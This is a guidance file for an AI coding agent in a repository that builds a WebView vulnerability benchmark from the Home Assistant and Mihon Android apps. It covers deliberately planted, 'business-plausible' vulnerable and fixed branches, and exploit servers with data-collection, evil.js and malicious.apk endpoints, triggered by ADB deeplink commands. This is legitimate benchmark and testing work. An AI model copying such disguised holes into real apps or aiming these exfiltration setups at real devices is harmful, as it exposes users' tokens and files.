# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project overview

HA-WebviewBench is a security benchmark for evaluating SAST/DAST tools and AI code audit models on Android WebView vulnerability detection. It provides curated, realistic WebView vulnerability samples (vulnerable + fixed versions) built on real open-source Android apps. Each sample targets exactly one minimum classification of WebView vulnerability.

Covered apps: Home Assistant Android 2026.5.2 (18 samples, complete) and Mihon v0.19.9 (13 samples, in progress).

## Repository layout (two-tier)

The root repo (`main` branch) holds documentation, exploit scripts, and benchmark metadata indices. It does **not** contain Android source code — that lives in gitignored per-app sub-repos under `apps/<app>/base/`, organized as git worktrees.

```
apps/<app>/
  base/              # Main worktree — clean base source. Never modified directly.
  BASE_COMMIT         # SHA of the clean base commit all samples branch from
  samples/<id>/       # Per-sample git worktree (18 for HA). vuln + fix share one worktree.
  server/<id>/        # Per-sample mock "official server" (redirect pages, static resources)
  design.md           # Concrete design: new features, servers, and sample designs for this app
exp/<app>/<id>/       # Exploit server (server.py + HTML attack pages) per sample
exp/template/         # Reusable exploit server template
samples/<app>/        # Per-app benchmark_samples.json metadata index
```

Each sample has:
- A **vuln branch** (`vuln/<id>`) and **fix branch** (`fix/<id>`) in the app's base git repo
- A single git **worktree** at `apps/<app>/samples/<id>/` shared between vuln and fix
- An entry in `samples/<app>/benchmark_samples.json`
- An exploit server at `exp/<app>/<id>/`

## Common commands

**Build an Android APK** (from the sample worktree directory, requires JDK 21):
```bash
cd apps/home-assistant/samples/<sample_id>/
JAVA_HOME="/c/Program Files/Java/jdk-21" ./gradlew.bat :app:assembleFullDebug \
  -x ':microwakeword:buildCMakeDebug' \
  '-x:microwakeword:buildCMakeDebug[arm64-v8a]' \
  '-x:microwakeword:buildCMakeDebug[armeabi-v7a]' \
  '-x:microwakeword:buildCMakeDebug[x86]' \
  '-x:microwakeword:buildCMakeDebug[x86_64]'
```
> The bracket `[abi]` exclusions need single-quote wrapping in bash. In PowerShell use:
> ```powershell
> .\gradlew.bat :app:assembleFullDebug `
>   -x :microwakeword:buildCMakeDebug `
>   '-x:microwakeword:buildCMakeDebug[arm64-v8a]' `
>   ...
> ```

**Build environment notes:**
- Requires **JDK 21** (`JAVA_HOME` must point to a full JDK, not a JRE). CMake 4.1.2 must be installed via Android SDK Manager.
- Windows **260-char path limit** can cause CMake FetchContent failures. Enable long paths: `Set-ItemProperty HKLM:\...\FileSystem -Name LongPathsEnabled -Value 1` (needs reboot). This was enabled on this machine on 2026-06-07; after reboot, the `-x` flags for microwakeword may no longer be needed.
- The `-x` flags exclude the microwakeword native module (wake-word detection). This is a build-time exclusion, not a source modification — the source stays clean.

**Run an exploit server:**
```bash
cd exp/home-assistant/<sample_id>/
python server.py
# HTTP on :8000 (attack pages, data collection, redirect, file upload)
# HTTPS on :8443 (self-signed cert, for TLS bypass scenarios)
```

**Trigger an exploit via ADB deeplink:**
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/<sample_id>"
```
For the HA app's debug build, use package `io.homeassistant.companion.android.debug`.

**Verify exploit success:** Check the `received/` directory under the exploit server for exfiltrated data.

**List git worktrees** (from the base repo):
```bash
cd apps/home-assistant/base/
git worktree list
```

## Development workflow

When modifying a vulnerability sample, follow this sequence:

### 1. Analyze (read-only)
- Read the sample entry in `apps/home-assistant/design.md` to understand intended vulnerability design
- Diff `vuln/<id>` vs `master` to see all changes
- Diff `vuln/<id>` vs `fix/<id>` to see the fix approach
- Check `webview漏洞分类说明.md` for the vulnerability category definition

### 2. Plan (before any edits)
- Identify which changes are **vulnerability-specific** (must stay), **shared infrastructure** (must stay), and **unnecessary artifacts** (should remove)
- Write a brief plan listing each file and what will change. Present to user for approval.

### 3. Implement (vuln first, then fix)
- Switch to vuln branch: `git switch vuln/<id>`
- Make changes, build from `W:\` (or with `-x` flags), fix any compilation errors
- Commit vuln: `git add . && git commit -m "vuln: <description>"`
- Switch to fix branch: `git switch fix/<id>`
- Apply same non-vulnerability changes (cleanup, encoding fixes, etc.)
- Build, commit fix
- Copy APKs to `apk/home-assistant/vuln/` and `apk/home-assistant/fix/`

### 4. Verify (both APKs on emulator)
```bash
# 1. Connect emulator
adb connect 127.0.0.1:7555  # MuMu

# 2. Install vuln APK
adb -s 127.0.0.1:7555 install -r apk/home-assistant/vuln/<id>.apk

# 3. Start exploit server
cd exp/home-assistant/<id>/
rm -rf received/*
python server.py &

# 4. Trigger exploit
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW \
  -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/<id>"

# 5. Check results (vuln should leak data)
ls received/
cat received/*

# 6. Repeat steps 2-5 with fix APK (fix should NOT leak sensitive data)
```

**Verification criteria:**
- **Vuln**: Exploit succeeds — sensitive data (device states, tokens, etc.) appears in `received/`
- **Fix**: Exploit fails — no sensitive data leaked. Ping/timestamp data is OK (JS can still run) but the vulnerability-specific capability (bridge access, file read, etc.) must be blocked

### 5. Finalize
- Update `benchmark_samples.json` if status changed
- Update `exp/home-assistant/<id>/readme.md` with correct verification steps
- Commit main repo changes

### Anti-patterns to avoid
- **Don't modify source to work around build issues.** Use Gradle `-x` flags or environment fixes instead. Source code should only change for vulnerability-related reasons.
- **Don't delete shared infrastructure.** The deeplink, `isDeeplinkFlow`, manifest intent-filter, and `DefaultFailFastHandler` changes are shared across all deeplink-based samples. Fix them if broken, but don't remove them.
- **Don't leave dead code in fix branches.** The fix should cleanly remove or restrict the vulnerability code. Don't just comment it out or leave it behind a confusing condition.
- **Don't commit IDE artifacts.** `.vscode/`, `.idea/`, and similar files should not be in sample branches.

## Vulnerability categories (5 classes, 17 sub-types)

| Category | IDs | Description |
|---|---|---|
| JS Interaction | 1.1–1.3 | Bridge exposure, insecure params, dynamic script injection |
| Resource Access Control | 2.1.1–2.4 | File/content access config, URL validation bypass, redirect, scheme handling, request interception |
| Event Callbacks | 3.1.1–3.1.4 | File selection, download, permission request, JS dialog callbacks |
| Network Trust | 4.1–4.2 | TLS certificate bypass, mixed content |
| Data Leakage | 5.1–5.2 | Cookie/token leakage, debug log leakage |

Full classification with code examples: `webview漏洞分类说明.md`.

## Architecture: how a sample is built

Samples are constructed by AI agents following two skill documents:

1. **`WebviewBench_design_skill.md`** — Design phase: analyzes a real WebView component, designs atomic "new features" that introduce vulnerability-triggering capabilities while maintaining business plausibility. Outputs a `design.md` like `apps/home-assistant/design.md`.

2. **`WebviewBench_sample_skill.md`** — Build phase: for one sample at a time, creates a git worktree from BASE_COMMIT, applies the vulnerability code, compiles, commits to `vuln/<id>`, updates `benchmark_samples.json`, optionally builds the fix branch, and optionally writes the exploit server.

Key design principles:
- **Atomic changes only** — each "new feature" is a single code change (one bridge, one callback, one config tweak). A sample may combine multiple features, but each is defined independently.
- **Business-plausible** — vulnerabilities must look like legitimate features (device control bridge, help-center redirect, file preview, notification preferences).
- **Mock data in assets** — sensitive values (tokens, cookies) are read from `assets/benchmark_mock_data.json` via business-named classes (e.g., `AccountSessionStore`), never hardcoded.
- **Clear security consequence** — every sample must demonstrably leak tokens, read private files, trigger system actions, etc. "Returns username" or "shows toast" is insufficient.

## Exploit server template

`exp/template/server.py` is the reusable base. Endpoints:
- `GET /collect?d=<data>` — universal data collection
- `POST /upload` — file upload (for file-chooser exploits)
- `GET /redirect?url=<url>` — 302 redirect (for redirect-based exploits)
- `GET /exp/<vid>` — serves `exp/<vid>.html` attack page
- `GET /evil.js` — serves malicious JS (for mixed-content exploits)
- `GET /malicious.apk` — serves fake APK (for download-callback exploits)

Per-sample exploit servers copy/adjust this template. Exploit data lands in `received/` (gitignored).

## Key design documents

- `apps/home-assistant/design.md` — complete HA design: 17 atomic new features, 4 mock official servers, 18 sample designs, plus a table of universal fixes applied across all deeplink-based samples.
- `webview漏洞分类说明.md` — canonical vulnerability taxonomy with code examples for each sub-type.
- `applist.md` — candidate apps for future benchmark expansion.
- `apps/home-assistant/server/` — mock official server implementations (e.g., notification polling server for sample 1.3).

## Git workflow

- **Never modify** `apps/<app>/base/` directly. All sample work happens in per-sample worktrees.
- vuln and fix branches for a sample share a single worktree — switch branches in that worktree, don't create a second.
- `benchmark_samples.json` records branch names, worktree paths, build commands, status, and server references per sample.
- Exploit code under `exp/` is not git-managed — no branches, no commits, just files on disk.
